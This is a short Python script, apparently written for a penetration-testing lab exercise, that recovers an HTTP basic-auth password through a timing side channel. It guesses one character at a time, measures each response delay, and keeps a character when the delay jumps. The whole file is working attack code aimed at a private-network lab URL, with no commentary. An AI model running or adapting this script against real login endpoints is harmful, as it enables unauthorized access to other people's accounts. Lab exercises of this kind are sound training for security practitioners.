import requests
import time


lasttime=0
password=''
url='http://192.168.35.146/authentication/example2/'
r = requests.get(url, auth=('hacker', 'test'))

while r.status_code==401:

 for letra in range(127):
   start = time.time()
   r = requests.get(url, auth=('hacker', str(password+chr(letra))))
   reqtime = time.time() - start
   print(password+chr(letra), "=", reqtime, r.status_code)
   diftime = reqtime - lasttime
   print(diftime)
   lasttime=reqtime
   if 0.1 <= diftime <= 0.6:
       print("found")
       password+=chr(letra)
       letra='a'
       break
   if r.status_code == 200:
        print("done!!")
        exit()
